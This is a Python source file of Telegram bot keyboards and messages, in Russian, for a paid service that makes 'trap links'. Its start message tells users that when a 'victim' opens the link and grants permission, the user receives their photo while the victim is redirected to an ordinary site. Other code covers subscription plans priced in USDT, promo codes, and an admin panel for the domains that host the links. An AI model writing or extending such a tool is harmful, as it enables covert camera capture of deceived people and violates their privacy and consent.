from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from config import ADMIN_ID
from datetime import datetime

def get_start_text(user, user_data):
    # Определяем статус подписки
    status_text = "Не активна"
    if user_data:
        expiry_str = user_data.get("expiry")
        builds = user_data.get("builds_balance", 0)
        
        if expiry_str:
            try:
                exp_dt = datetime.fromisoformat(expiry_str)
                delta = exp_dt - datetime.now()
                if delta.total_seconds() > 0:
                    days = delta.days
                    hours = delta.seconds // 3600
                    if days > 0:
                        status_text = f"осталось {days} дн. и {hours} ч."
                    else:
                        status_text = f"осталось {hours} ч."
                else:
                     # Если время истекло, проверяем билды
                    if builds > 0:
                        status_text = f"осталось {builds} сборок"
            except:
                pass
        elif builds > 0:
             status_text = f"осталось {builds} сборок"

    # Если админ - всегда имеет доступ, но показываем статус как есть
    if user.id == ADMIN_ID and status_text == "Не активна":
        status_text = "∞ (Админ)"

    return (
        f"👤 <b>{user.first_name}</b>\n"
        f"🆔 <code>{user.id}</code>\n"
        f"💎 Подписка: <b>{status_text}</b>\n\n"
        "Я помогу тебе создать <b>ссылку-ловушку</b>.\n" 
        "Когда жертва перейдет по ней и даст разрешение, ты получишь фото, а она будет перенаправлена на обычный сайт.\n\n" 
        "👇 <b>Меню:</b>"
    )

def get_start_kb(user_id):
    buttons = [
        [InlineKeyboardButton(text="🔗 Создать ссылку", callback_data="create_link")],
        [InlineKeyboardButton(text="💳 Подписка", callback_data="sub")]
    ]
    
    if user_id != ADMIN_ID:
        buttons.append([InlineKeyboardButton(text="ℹ️ Инфо", callback_data="info")])
    
    if user_id == ADMIN_ID:
        buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="admin_panel")])
        
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_cancel_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_build")]
    ])

def get_confirm_kb(action_prefix):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Да", callback_data=f"{action_prefix}_yes"),
            InlineKeyboardButton(text="Нет", callback_data=f"{action_prefix}_no")
        ]
    ])

def get_domains_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="➕ Добавить", callback_data="d_add"),
            InlineKeyboardButton(text="📋 Список", callback_data="d_list_0")
        ],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_panel")]
    ])

def get_domains_list_kb(domains_list, page=0):
    items_per_page = 5
    start_idx = page * items_per_page
    end_idx = start_idx + items_per_page
    page_domains = domains_list[start_idx:end_idx]
    
    buttons = []
    for domain in page_domains:
        buttons.append([InlineKeyboardButton(text=domain, callback_data=f"d_inf_{domain}")])
        
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️", callback_data=f"d_list_{page-1}"))
    if end_idx < len(domains_list):
        nav_buttons.append(InlineKeyboardButton(text="➡️", callback_data=f"d_list_{page+1}"))
    if nav_buttons:
        buttons.append(nav_buttons)
        
    buttons.append([InlineKeyboardButton(text="🔙 Назад", callback_data="d_menu")])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_domains_selection_kb(domains_list, page=0):
    items_per_page = 5
    start_idx = page * items_per_page
    end_idx = start_idx + items_per_page
    page_domains = domains_list[start_idx:end_idx]
    
    buttons = []
    for domain in page_domains:
        # При выборе домена передаем его в callback
        buttons.append([InlineKeyboardButton(text=domain, callback_data=f"sd_{domain}")])
        
    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton(text="⬅️", callback_data=f"sd_p_{page-1}"))
    if end_idx < len(domains_list):
        nav_buttons.append(InlineKeyboardButton(text="➡️", callback_data=f"sd_p_{page+1}"))
    if nav_buttons:
        buttons.append(nav_buttons)
        
    buttons.append([InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_build")])
    
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_domain_info_kb(domain):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🗑 Удалить", callback_data=f"d_del_ask_{domain}")],
        [InlineKeyboardButton(text="🔙 К списку", callback_data="d_list_0")]
    ])

def get_sub_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💎 Тарифы", callback_data="buy_menu")],
        [InlineKeyboardButton(text="🎟 Ввести промокод", callback_data="enter_promo")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="cancel_build")]
    ])

def get_plans_kb():
    # Цены и время можно менять
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🕒 1 день - 2 USDT", callback_data="buy_2_24")],
        [InlineKeyboardButton(text="🕒 7 дней - 10 USDT", callback_data="buy_10_168")],
        [InlineKeyboardButton(text="🕒 30 дней - 30 USDT", callback_data="buy_30_720")],
        [InlineKeyboardButton(text="🔙 Назад", callback_data="sub")]
    ])